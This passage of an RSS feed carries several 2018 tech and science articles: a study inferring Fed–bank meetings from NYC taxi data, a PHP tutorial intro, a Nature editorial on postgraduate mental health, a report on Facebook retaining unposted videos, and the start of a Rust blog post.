&lt;p&gt;“These inferred meetings might pertain to monetary policy or could be social in nature,” said Finer. “The data don’t tell us. What we do know is that every interaction entails the risk that an outside party might gain valuable insights into the Fed.”&lt;/p&gt;
&lt;p&gt;In a nod to the power of Big Data, Finer began his work after the New York City Taxi &amp;amp; Limousine Commission released a dataset of more than a billion individual, anonymous cab rides in Manhattan going back to 2009. The dataset provided precise drop-off and pickup coordinates. For purposes of the study, Finer narrowed the dataset to yellow taxi rides that occurred between 2009 and 2014, omitted weekends and holidays and put other filters in place, yielding a dataset of more than 500 million taxi rides.&lt;/p&gt;
&lt;p&gt;Among the study’s key findings:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The data yield evidence that rides from commercial banks directly to the New York Fed and offsite meetings involving insiders of the New York Fed and commercial banks increased around the time of FOMC meetings.&lt;/li&gt;
&lt;li&gt;The data show a striking increase in rides from the commercial banks to the New York Fed almost immediately after the midnight lifting of the communications blackout. Tight restrictions on Federal Reserve staff communications are in force until midnight the day after an FOMC announcement, and rides to the New York Fed are elevated between 1  and 4 a.m. thereafter. The timing and location suggest that information pertinent to the conduct of monetary policy is being shared. The Fed might, for example, seek information on bond market conditions or provide clarification about the announcement.&lt;/li&gt;
&lt;li&gt;Analysis of nearly coincidental drop-offs suggests that offsite lunchtime meetings between New York Fed insiders and commercial bankers increase around FOMC announcements. Coincidences are elevated from approximately the day before the announcement through a week afterward. The increase might partially reflect pent-up demand for meetings due to the blackout.  &lt;/li&gt;
&lt;li&gt;Both the post-blackout direct rides and lunchtime coincidental drop-offs were particularly elevated around monetary policy meetings in 2012, the year of the announcement of the third round of quantitative easing known as QE3.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Leaking information became an issue at the Federal Reserve in 2012 as policymakers worked to ease the effects of the Great Recession. According to the transcripts of 2012 Fed policy meetings released earlier this year, Federal Reserve Chairman Ben Bernanke had warned his colleagues at an October 2012 policy meeting that disclosure of sensitive Fed policy deliberations, even if unintentional, could damage the central bank’s credibility and reputation.&lt;/p&gt;
&lt;p&gt;Fed guidelines prohibit officials from discussing confidential information. The rules also restrict Fed policymakers’ and staff members’ ability to speak publicly or grant interviews during the Fed’s blackout periods, which occur around FOMC meetings.&lt;/p&gt;
&lt;p&gt;Since this study captures only New York City yellow taxi rides, Finer said he believes that the results of this study represent the lower end of possibilities for changes in interactions around FOMC meetings and that the actual number of additional occurrences might be significantly greater.&lt;/p&gt;
&lt;p&gt;“While this research focuses on the Fed and commercial banks, it touches on far more than just opportunities for information flow between financial institutions,” said Finer. “This study provides a taste of what private ride-share companies such as Uber and Lyft can do with their data. It’s just one example of what can be learned from the data that large corporations collect on where we go and when, even if there are no clear personal identifiers.”&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://newschicagobooth.uchicago.edu/newsroom/how-nyc-taxi-ride-data-suggest-cozy-relationship-between-big-banks-and-fed&quot;&gt;—Article originally appeared on the Chicago Booth website&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 01 Apr 2018 00:08:00 +0000</pubDate>
<dc:creator>walterbell</dc:creator>
<og:type>article</og:type>
<og:title>NYC taxi ride data suggest cozy relationship between big banks and the Fed</og:title>
<og:url>https://news.uchicago.edu/article/2018/03/06/nyc-taxi-ride-data-suggest-cozy-relationship-between-big-banks-and-fed</og:url>
<og:description>Everyone in the financial markets would like to know what U.S. Federal Reserve policymakers are thinking. Will they raise interest rates? Where do they believe that the economy is going? What is their next move, and how will it affect my pocketbook?</og:description>
<og:image>https://news.uchicago.edu/sites/default/files/images/image/20180305/taxi-cab-381233960720.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.uchicago.edu/article/2018/03/06/nyc-taxi-ride-data-suggest-cozy-relationship-between-big-banks-and-fed</dc:identifier>
</item>
<item>
<title>Modern PHP without a framework</title>
<link>https://kevinsmith.io/modern-php-without-a-framework</link>
<guid isPermaLink="true" >https://kevinsmith.io/modern-php-without-a-framework</guid>
<description>&lt;p&gt;I've got a challenge for you. The next time you start a new project, try &lt;em&gt;&lt;strong&gt;not&lt;/strong&gt;&lt;/em&gt; using a PHP framework.&lt;/p&gt;
&lt;p&gt;Now, this isn't an anti-framework screed. Neither is it a promotion of &lt;a href=&quot;https://en.wikipedia.org/wiki/Not_invented_here&quot; target=&quot;_blank&quot;&gt;not-invented-here&lt;/a&gt; thinking. After all, we're going to be using some packages written by several framework developers in this tutorial. I've got nothing but great respect for the innovation going on in that space.&lt;/p&gt;
&lt;p&gt;This isn't about them. This is about you. It's about giving yourself the opportunity to grow as a developer.&lt;/p&gt;
&lt;p&gt;Perhaps the biggest benefit you'll find working without a framework is the wealth of knowledge about what's going on under the hood. You get to see exactly what's happening without relying on the framework's magic to take care of things for you in a way that you can't debug and don't really understand.&lt;/p&gt;
&lt;p&gt;It's quite possible your next job will not grant the luxury of starting a greenfield project with your framework of choice. The reality is that most high-value, business-critical PHP jobs involve existing applications. And whether that application is built in a framework currently enjoying popular support like Laravel or Symfony, a framework from days gone by like CodeIgniter or FuelPHP, or even the depressingly widespread &lt;a href=&quot;https://leanpub.com/mlaphp&quot; target=&quot;_blank&quot;&gt;legacy PHP application employing an &quot;include-oriented architecture&quot;&lt;/a&gt;, building &lt;em&gt;without&lt;/em&gt; a framework now will better prepare you to take on &lt;em&gt;any&lt;/em&gt; PHP project in the future.&lt;/p&gt;
&lt;p&gt;In the past, it was an uphill battle to build without a framework because &lt;em&gt;some kind of system&lt;/em&gt; had to interpret and route HTTP requests, send HTTP responses, and manage dependencies. The lack of industry standards necessarily meant that, at the very least, &lt;em&gt;those&lt;/em&gt; components of a framework were tightly coupled. If you didn't start with a framework, you'd end up building one yourself.&lt;/p&gt;
&lt;p&gt;But today, thanks to all the autoloading and interoperability work done by &lt;a href=&quot;https://www.php-fig.org/&quot; target=&quot;_blank&quot;&gt;PHP-FIG&lt;/a&gt;, building without a framework doesn't mean building it all by yourself. There are so many excellent, interoperable packages from a wide range of vendors. Pulling it all together is easier than you think!&lt;/p&gt;
</description>
<pubDate>Sat, 31 Mar 2018 22:24:52 +0000</pubDate>
<dc:creator>vanilla-almond</dc:creator>
<og:type>website</og:type>
<og:url>https://kevinsmith.io/modern-php-without-a-framework</og:url>
<og:title>Modern PHP Without a Framework | Kevin Smith</og:title>
<og:description>I've got a challenge for you. The next time you start a new project, try *not* using a PHP framework.</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://kevinsmith.io/modern-php-without-a-framework</dc:identifier>
</item>
<item>
<title>Time to talk about why so many postgrads have poor mental health</title>
<link>https://www.nature.com/articles/d41586-018-04023-5</link>
<guid isPermaLink="true" >https://www.nature.com/articles/d41586-018-04023-5</guid>
<description>&lt;div class=&quot;content position-relative cleared clear mq1200-padded&quot; data-component=&quot;article-container&quot; role=&quot;main&quot;&gt;
&lt;header class=&quot;article-item__header clear cleared pull--both&quot;&gt;&lt;div class=&quot;article__type&quot;&gt;EDITORIAL
&lt;div class=&quot;ml10 article__date&quot;&gt;&lt;time itemprop=&quot;datePublished&quot;&gt;29 March 2018&lt;/time&gt;&lt;/div&gt;
&lt;/div&gt;


&lt;div class=&quot;article-item__teaser-text serif&quot;&gt;An outpouring on Twitter highlights the acute pressures on young scientists.&lt;/div&gt;
&lt;/header&gt;

&lt;div class=&quot;align-left&quot;&gt;
&lt;div class=&quot;article__body serif cleared&quot;&gt;
&lt;div class=&quot;embed intensity--high&quot;&gt;&lt;img class=&quot;figure__image&quot; alt=&quot;Graduate sits alone in rows of white chairs&quot; src=&quot;https://media.nature.com/w800/magazine-assets/d41586-018-04023-5/d41586-018-04023-5_15577648.jpg&quot;/&gt;&lt;p class=&quot;figure__caption sans-serif&quot;&gt;&lt;span class=&quot;mr10&quot;&gt;Don’t feel alone: share your stories of mental-health issues and help &lt;em&gt;Nature&lt;/em&gt; to tackle the problem.&lt;/span&gt;&lt;span&gt;Credit: Getty&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;Poor mental health is an issue for many of our readers. That fact is underscored by the response to a &lt;a href=&quot;https://twitter.com/NatureNews/status/978212558938296321&quot; data-track=&quot;click&quot; data-label=&quot;https://twitter.com/NatureNews/status/978212558938296321&quot; data-track-category=&quot;body text link&quot;&gt;tweet sent by @NatureNews earlier this week&lt;/a&gt;, which highlighted that rates of depression and anxiety reported by postgraduate students are &lt;a href=&quot;https://www.nature.com/articles/nbt.4089&quot; data-track=&quot;click&quot; data-label=&quot;https://www.nature.com/articles/nbt.4089&quot; data-track-category=&quot;body text link&quot;&gt;six times higher than in the general population (T. M. Evans &lt;em&gt;et al. Nature Biotechnol.&lt;/em&gt; &lt;strong&gt;36,&lt;/strong&gt; 282–284; 2018)&lt;/a&gt;, and asked what should be done to help. The figures are a shock, but it was the reaction that blew us away: more than 1,200 retweets and around 170 replies.&lt;/p&gt;
&lt;p&gt;“This is not one dimensional problem. Financial burden, hostile academia, red tape, tough job market, no proper career guidance. Take your pick,” read one. “Maybe being told day in, day out that the work you spend 10+ hrs a day, 6–7 days a week on isn’t good enough,” said another.&lt;/p&gt;
&lt;p&gt;The feedback emphasizes something that &lt;em&gt;Nature&lt;/em&gt; has highlighted often in recent years: there is a problem among young scientists. Too many have mental-health difficulties, and too many say that the demands of the role are partly to blame. Neither issue gets the attention it deserves. “I’d love to see some of the comments under this thread published,” wrote one responder. “There needs to be real conversation about this, not just observation.”&lt;/p&gt;
&lt;p&gt;We agree — which is why we are publishing some of the responses. (You can read the full thread &lt;a href=&quot;http://go.nature.com/2gtjxq&quot; data-track=&quot;click&quot; data-label=&quot;http://go.nature.com/2gtjxq&quot; data-track-category=&quot;body text link&quot;&gt;here&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;Some commenters said that the way to improve things was through wholesale change. “The whole PhD+postdoc system must be reformed or abolished,” noted one.&lt;/p&gt;
&lt;p&gt;Others focused on specific concerns. “Decent funding which runs until their subimission [&lt;em&gt;sic&lt;/em&gt;] deadline, coupled with a culture shift to less focus on publications in certain journals defining success.”&lt;/p&gt;
&lt;p&gt;There is a problem with the culture in science, and it is one that loads an increasing burden on the shoulders of younger generations. The evidence suggests that they are feeling the effects. (Among the tweets, one proposed solution to improving the PhD is to “treat it like professional training instead of indentured servitude with no hope of a career at the end?”.) It will take a while to change that culture — and, unfortunately, it will probably take almost as long for some in the community to realize the need to change. But change it must.&lt;/p&gt;
&lt;p&gt;A good place to start is the relationship between postgraduates and their supervisors. Surveys — &lt;a href=&quot;https://www.nature.com/nature/journal/v550/n7677/full/nj7677-549a.html&quot; data-track=&quot;click&quot; data-label=&quot;https://www.nature.com/nature/journal/v550/n7677/full/nj7677-549a.html&quot; data-track-category=&quot;body text link&quot;&gt;including our own&lt;/a&gt; — suggest that too many senior scientists see a career outside academia after a PhD as a failure. Too often, this attitude drives expectations and conversations that do not reflect the reality: there are just not enough full-time academic posts to go around.&lt;/p&gt;
&lt;p&gt;We are committed to covering the unique pressures that face young scientists, and the need to reform the PhD. We intend to revisit this topic, starting in May, with a Careers Feature on depression. We want to hear more from readers on mental-health issues and the stresses that contribute. You can &lt;a href=&quot;http://go.nature.com/stress-stories&quot; data-track=&quot;click&quot; data-label=&quot;http://go.nature.com/stress-stories&quot; data-track-category=&quot;body text link&quot;&gt;share your stories in confidence here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We thank those who have already told theirs. “I hold down three jobs to fund my PhD, living in hopes of funding, it’s a constant strain. So many others out there like me, and sometimes I wonder if it’s even worth it. The research community will lose so many great minds to issues like this. It needs to be changed.”&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span class=&quot;emphasis&quot;&gt;Nature&lt;/span&gt; &lt;span&gt;&lt;strong&gt;556&lt;/strong&gt;, 5 (2018)&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;nature-briefing nature-briefing--article cleared&quot; data-track-component=&quot;nature-briefing&quot;&gt;
&lt;header class=&quot;nature-briefing__header&quot;&gt;&lt;span class=&quot;visually-hidden&quot;&gt;Nature Briefing&lt;/span&gt;&lt;/header&gt;&lt;div class=&quot;pa10 pt20&quot;&gt;
&lt;p class=&quot;serif nature-briefing__slogan mr30&quot;&gt;&lt;strong&gt;Sign up for the daily &lt;span class=&quot;emphasis&quot;&gt;Nature Briefing&lt;/span&gt; email newsletter&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;sans-serif nature-briefing__standfirst mr30&quot;&gt;Stay up to date with what matters in science and why, handpicked from &lt;span class=&quot;emphasis&quot;&gt;Nature&lt;/span&gt; and other publications worldwide.&lt;/p&gt;
&lt;p class=&quot;cleared&quot;&gt;&lt;a class=&quot;nature-briefing__link&quot; data-track=&quot;click&quot; data-track-label=&quot;nature briefing article link&quot; target=&quot;_blank&quot; rel=&quot;noreferrer noopener&quot; href=&quot;https://www.nature.com/briefing/signup/&quot;&gt;Sign Up&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;aside class=&quot;article__aside align-right&quot;&gt;&lt;div class=&quot;related-content shrink--aside&quot;&gt;
&lt;h3 class=&quot;aside__title sans-serif&quot;&gt;Related Articles&lt;/h3&gt;
&lt;/div&gt;

&lt;div id=&quot;div-gpt-ad-right-2&quot; class=&quot;div-gpt-ad advert medium-rectangle js-ad text-center hide-print grade-c-hide hide-overflow&quot; data-gpt-unitpath=&quot;/285/nature.com/article&quot; data-gpt-sizes=&quot;300x250&quot; data-gpt-targeting=&quot;pos=right;artid=/articles/d41586-018-04023-5&quot;&gt;&lt;noscript&gt;
&lt;p&gt;&lt;a href=&quot;https://pubads.g.doubleclick.net/gampad/jump?iu=/285/nature.com/article&amp;amp;sz=300x250&amp;amp;c=-979435215&amp;amp;t=pos%3Dright%26artid%3D/articles/d41586-018-04023-5&quot;&gt;&lt;img data-test=&quot;gpt-advert-fallback-img&quot; src=&quot;https://pubads.g.doubleclick.net/gampad/ad?iu=/285/nature.com/article&amp;amp;sz=300x250&amp;amp;c=-979435215&amp;amp;t=pos%3Dright%26artid%3D/articles/d41586-018-04023-5&quot; alt=&quot;Advertisement&quot; width=&quot;300&quot; height=&quot;250&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/noscript&gt;&lt;/div&gt;
&lt;/aside&gt;&lt;/div&gt;
</description>
<pubDate>Sat, 31 Mar 2018 21:53:29 +0000</pubDate>
<dc:creator>amelius</dc:creator>
<og:url>http://www.nature.com/articles/d41586-018-04023-5</og:url>
<og:type>article</og:type>
<og:title>Time to talk about why so many postgrads have poor mental health</og:title>
<og:description>An outpouring on Twitter highlights the acute pressures on young scientists.</og:description>
<og:image>https://media.nature.com/lw1024/magazine-assets/d41586-018-04023-5/d41586-018-04023-5_15577650.jpg</og:image>
<dc:language>EN</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.nature.com/articles/d41586-018-04023-5</dc:identifier>
</item>
<item>
<title>Facebook Secretly Saved Videos Users Deleted</title>
<link>https://nymag.com/selectall/2018/03/facebook-secretly-saved-videos-users-deleted.html</link>
<guid isPermaLink="true" >https://nymag.com/selectall/2018/03/facebook-secretly-saved-videos-users-deleted.html</guid>
<description>&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbf50ts006ysby6qeqp5b4i@published&quot; data-word-count=&quot;61&quot;&gt;Have you downloaded your &lt;a href=&quot;http://nymag.com/selectall/2018/03/how-to-download-all-your-facebook-data.html&quot;&gt;Facebook data archive&lt;/a&gt; yet? Facebook makes it easy to obtain a ZIP file of all the data it has on you: your status updates, your friend list, your messages … and, as I and several people I spoke with were surprised to discover, every video you ever filmed on the platform — including videos you never published.&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbf6nfr00193d55eubkgkpm@published&quot; data-word-count=&quot;100&quot;&gt;Cambridge Analytica’s effect on the election is still disputed, but if there’s one thing everyone can agree is true in the wake of the scandal over its data-harvesting, it’s that we’ve paid far too little attention to the scale and scope of the data that Facebook has collected on us over our years of platform use. It’s true that, in most cases, we’ve “consented” to this kind of data-gathering by clicking “okay” on a dense terms-of-service contract, and neglecting to opt out. But given how often the details are ignored, it’s disconcerting to discover exactly what data has been gathered.&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbienkt000w2c5pk92fmqym@published&quot; data-word-count=&quot;99&quot;&gt;Last week, Facebook users around the world discovered that Facebook’s Android app had, in some cases, Hoovered up extensive call data without their awareness. “When this feature is enabled, uploading your contacts also allows us to use information like when a call or text was made or received. This feature does not collect the content of your calls or text messages,” Facebook &lt;a href=&quot;https://newsroom.fb.com/news/2018/03/fact-check-your-call-and-sms-history/&quot;&gt;said&lt;/a&gt;, noting that users had to initially opt in to have their communication tracked. But it seems unlikely that many of the people who “opted in” were aware that they’d done so, or what exactly it meant.&lt;/p&gt;


&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbf6nfy001c3d55jydudzmd@published&quot; data-word-count=&quot;59&quot;&gt;And call logs aren’t the only data Facebook’s been holding to user surprise. Earlier this week, like many people around the world, my sister Bailey downloaded her Facebook data archives. Along with the contact lists and relationship statuses was something unexpected: several different videos of her attempting to play a scale on a wooden flute in her childhood bedroom.&lt;/p&gt;

&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbf6nfx001b3d552bt3ylyz@published&quot; data-word-count=&quot;96&quot;&gt;Each video, she discovered, was a different “take” — recorded on Facebook, but then, she assumed, discarded before she posted the final version to a friend’s wall. (In the archive, you can infer which video was posted on a wall versus the ones that weren’t based on the comments. Videos that were never published are commentless.) In one of the clips, you can hear Kircher say, exasperatedly, that it is her 13th take. At the end of the clip, which isn’t to her liking, she groans and reaches forward, apparently to delete the video and try again.&lt;/p&gt;
&lt;div data-uri=&quot;nymag.com/selectall/_components/youtube/instances/cjfbf72la001p3d5510zdfof2@published&quot; class=&quot;youtube&quot; data-element-id=&quot;youtube-player-x8p2CKTz&quot; data-video-id=&quot;mLFlUw7Qwjw&quot; data-autoplay-next-video=&quot;true&quot; data-autoplay-video=&quot;false&quot; data-playlist=&quot;PLtmzdzCeRsyHh67c-VlEj8Nqpj5nL8pf6&quot; data-track-video-type=&quot;Editorial&quot; data-track-video-location=&quot;article&quot; data-track-video-title=&quot;Bailey Playing The Flute&quot; data-track-video-duration=&quot;12&quot; data-track-channel-name=&quot;New York Magazine&quot; data-editable=&quot;inline&quot;&gt;

&lt;p class=&quot;youtube-caption&quot;&gt;Bailey Kircher never posted this video on Facebook, but still found a copy of it in her Facebook archive.&lt;/p&gt;
&lt;/div&gt;

&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbf8b7c001w3d55kyh0o61v@published&quot; data-word-count=&quot;106&quot;&gt;How did this happen? In the pre–Facebook Live era, leaving videos on your friends’ walls was something of a crude FaceTime. You’d post a video, they’d respond with a video, and so forth. Importantly, Facebook had a feature that let users film videos via webcam on Facebook itself — that is, without ever leaving the Facebook site to use a video recorder. Once you were done filming, Facebook would show you a preview of your clip. If you decided to do another take, you could click to discard that video and try it again. Except, the video wasn’t actually deleted. Instead, Facebook apparently saved your unused clip.&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbf8xpy00213d550gn1vgn1@published&quot; data-word-count=&quot;106&quot;&gt;Another co-worker, Brittany Stephanis, found over 100 videos in her archive and says that she only ever publicly posted about a third of them. The earliest date back to Christmas Day in 2008 when Stephanis, then 13, started recording videos to wish her friends a happy holiday. Stephanis says that her archive contains videos she clearly never planned to shared with anyone. “There are videos of me just checking my teeth,” she explained. My sister also had videos — rehearsing for school musicals and cheerleading — where she was using Facebook’s desktop camera to review herself and then erase, or so she thought, the video forever.&lt;/p&gt;


&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbigtk3000z2c5phthenwag@published&quot; data-word-count=&quot;49&quot;&gt;I thought this was a funny quirk of my sister’s. And then I looked at my own data archive. There, at the bottom of the list of videos I’d put on the platform, I found clips that appear to have never been posted to Facebook but were saved anyway.&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbg4azs000u3d55zibgneb0@published&quot; data-word-count=&quot;127&quot;&gt;From what I can tell, most people haven’t noticed this yet. (Or, possibly, they have and are unperturbed.) One reason might be that the videos are saved in the FLV format, short for Flash Video. Most default video players can’t read them, but you can watch them in VLC. You can’t preview a .flv file in a file browser, which could make it a little trickier to figure out what videos Facebook has of yours. To find yours, download your data archive — instructions &lt;a href=&quot;http://nymag.com/selectall/2018/03/how-to-download-all-your-facebook-data.html&quot;&gt;here&lt;/a&gt; — and open the file. Select the index, which will open your archive in your web browser. From there, click the video section to see what’s what. (You might need to download the free app VLC player, which can play Flash videos.)&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbf8xpz00223d55lggvjof5@published&quot; data-word-count=&quot;167&quot;&gt;Facebook saving data you didn’t share isn’t an entirely new concern. Back in 2013, then–Facebook intern and Ph.D. student at Carnegie Mellon Sauvik Das and Adam Kramer, a Facebook data scientist, put together &lt;a href=&quot;http://www.slate.com/articles/technology/future_tense/2013/12/facebook_self_censorship_what_happens_to_the_posts_you_don_t_publish.html&quot;&gt;a study&lt;/a&gt; on what they deemed “self-censorship” on the platform. Self-censorship, according to their work, was anything a user typed in the status box but ultimately didn’t post. Data that Facebook can track. Facebook’s current &lt;a href=&quot;https://www.facebook.com/about/privacy/&quot;&gt;data policy&lt;/a&gt; says that the company can “collect the content and other information you provide when you use our Services, including when you sign up for an account, create or share, and message or communicate with others.” “Create” is the operative word in there. By that logic, Facebook technically &lt;em&gt;could&lt;/em&gt; save any video a user filmed but did not publish because you &lt;em&gt;created&lt;/em&gt; it on the platform. Still, that requires the kind of close read of the fine print that most humans, at least not before &lt;a href=&quot;http://nymag.com/selectall/2018/03/why-should-i-even-care-about-the-facebook-stuff.html&quot;&gt;Facebook’s ongoing Cambridge Analytica privacy fiasco&lt;/a&gt;, likely aren’t taking the time to do.&lt;/p&gt;


&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbfbq9500293d555q0ic6xd@published&quot; data-word-count=&quot;122&quot;&gt;An industry expert recently told me about another “open secret” — that when Instagram first introduced video, the company would begin uploading a user’s video while they wrote a caption. That way, when the user pressed “post,” the video would already be good to go, and the user wouldn’t have to wait while the video uploaded in real time. Instagram co-founder Mike Krieger explained this in a presentation on the “&lt;a href=&quot;https://speakerdeck.com/mikeyk/secrets-to-lightning-fast-mobile-design&quot;&gt;Secrets to Lightning Fast Mobile Design&lt;/a&gt;” in 2011. It doesn’t seem unreasonable that a similar system might have been used at Facebook to create a faster, cleaner user experience. Except, unlike Instagram which says it threw out the data if a user cancelled the post, it appears Facebook was keeping the videos.&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbfbsxq002d3d55mvhg9ux5@published&quot; data-word-count=&quot;109&quot;&gt;I reached out to Facebook for comment today, and the company asked me to connect them with Kircher so she could consent to the company investigating why these outtakes were in her data archives. The representative told me the company thinks they’ve “gotten to the bottom of it,” but that Facebook was still figuring out what it could share. Later, a Facebook representative provided a statement saying that the company is still looking into the matter: “We’ve heard that when accessing their information from our Download Your Information tool, some people are seeing their old videos that do not appear on their profile or Activity Log. We are investigating.”&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbfby01002h3d55lwfb51u2@published&quot; data-word-count=&quot;73&quot;&gt;The videos that Stephanis and Kircher found in their archives are pretty harmless, at least in terms of content. But it’s easy to imagine a user filming something that wasn’t quite so juvenile and being horrified to discover that Facebook has a copy. Apropos of, well, everything, now seems like a good time to mention that Mark Zuckerberg keeps a piece of tape over his webcam. Seems like he might be onto something.&lt;/p&gt;
&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbni9ct000u3d55pnrmbxxj@published&quot; data-word-count=&quot;16&quot;&gt;&lt;strong&gt;Update, March 28, 6:16 p.m.:&lt;/strong&gt; &lt;em&gt;This piece has been edited to include a statement from Facebook.&lt;/em&gt;&lt;/p&gt;

&lt;p class=&quot;clay-paragraph&quot; data-editable=&quot;text&quot; data-uri=&quot;nymag.com/selectall/_components/clay-paragraph/instances/cjfbfby01002i3d55neqqtajb@published&quot; data-word-count=&quot;22&quot;&gt;If you’ve also found questionable things in your Facebook data archive, I’d love to hear about it. Please email me at &lt;a href=&quot;mailto:madison.kircher@nymag.com&quot;&gt;madison.kircher@nymag.com&lt;/a&gt;.&lt;/p&gt;
</description>
<pubDate>Sat, 31 Mar 2018 20:16:10 +0000</pubDate>
<dc:creator>walterbell</dc:creator>
<og:title>Ever Record a Video on Facebook? Facebook Still Has It.</og:title>
<og:url>http://nymag.com/selectall/2018/03/facebook-secretly-saved-videos-users-deleted.html</og:url>
<og:description>Facebook quietly saved videos users filmed on the platform but never actually posted.</og:description>
<og:image>https://pixel.nymag.com/imgs/daily/selectall/2018/03/28/28-facebook-video-grid.w1200.h630.jpg</og:image>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://nymag.com/selectall/2018/03/facebook-secretly-saved-videos-users-deleted.html</dc:identifier>
</item>
<item>
<title>Voyager 1 Fires Up Thrusters After 37 Years</title>
<link>https://www.nasa.gov/feature/jpl/voyager-1-fires-up-thrusters-after-37</link>
<guid isPermaLink="true" >https://www.nasa.gov/feature/jpl/voyager-1-fires-up-thrusters-after-37</guid>
<description>[unable to retrieve full-text content]&lt;p&gt;Article URL: &lt;a href=&quot;https://www.nasa.gov/feature/jpl/voyager-1-fires-up-thrusters-after-37&quot;&gt;https://www.nasa.gov/feature/jpl/voyager-1-fires-up-thrusters-after-37&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=16724149&quot;&gt;https://news.ycombinator.com/item?id=16724149&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Points: 255&lt;/p&gt;&lt;p&gt;# Comments: 54&lt;/p&gt;</description>
<pubDate>Sat, 31 Mar 2018 17:18:00 +0000</pubDate>
<dc:creator>colanderman</dc:creator>
<og:description>The Voyager team is able to use a set of four backup thrusters, dormant since 1980, for orienting the spacecraft.</og:description>
<og:title>Voyager 1 Fires Up Thrusters After 37 Years</og:title>
<og:image>http://www.nasa.gov/sites/default/files/thumbnails/image/pia21839-main.jpg</og:image>
<og:url>http://www.nasa.gov/feature/jpl/voyager-1-fires-up-thrusters-after-37</og:url>
<og:type>article</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.nasa.gov/feature/jpl/voyager-1-fires-up-thrusters-after-37/</dc:identifier>
</item>
<item>
<title>You can&amp;#039;t Rust that</title>
<link>http://lucumr.pocoo.org/2018/3/31/you-cant-rust-that/</link>
<guid isPermaLink="true" >http://lucumr.pocoo.org/2018/3/31/you-cant-rust-that/</guid>
<description>&lt;p class=&quot;date&quot;&gt;written on Saturday, March 31, 2018&lt;/p&gt;
&lt;p&gt;The last year has been fun because I could build a lot for really nice stuff for &lt;a class=&quot;reference external&quot; href=&quot;https://sentry.io/&quot;&gt;Sentry&lt;/a&gt; in Rust and for the first time the development experience was without bigger roadblocks. While we have been using Rust before it now feels different because the ecosystem is so much more stable and we ran less against language or tooling issues.&lt;/p&gt;
&lt;p&gt;However talking to people new to Rust (and even brainstorming APIs with coworkers) it's hard to get rid of the feeling that Rust can be a mind bending adventure and that the best way to have a stress free experience is knowing upfront what you cannot (or should not attempt to) do. Knowing that certain things just cannot be done helps putting your mind back back on the right track.&lt;/p&gt;
&lt;p&gt;So here are things not to do in Rust and what to do instead which I think should be better known.&lt;/p&gt;
&lt;div class=&quot;section&quot; id=&quot;things-move&quot; readability=&quot;64.930576254347&quot;&gt;
&lt;h2&gt;Things Move&lt;/h2&gt;
&lt;p&gt;The biggest difference between Rust and C++ for me is the address-of operator (&lt;cite&gt;&amp;amp;&lt;/cite&gt;). In C++ (like C) that thing just returns the address of whatever its applied to and while the language might put some restrictions on you when doing so is a good idea, there is generally nothing stopping you from taking an address of a value and then using it.&lt;/p&gt;
&lt;p&gt;In Rust this is just usually not useful. First of all the moment you take a reference in Rust the borrow checker looms over your code and prevents you from doing anything stupid. More importantly however is that even if it's safe to take a reference it's not nearly as useful as you might think. The reason for this is that objects in Rust generally move around.&lt;/p&gt;
&lt;p&gt;Just take how objects are typically constructed in Rust:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre&gt;
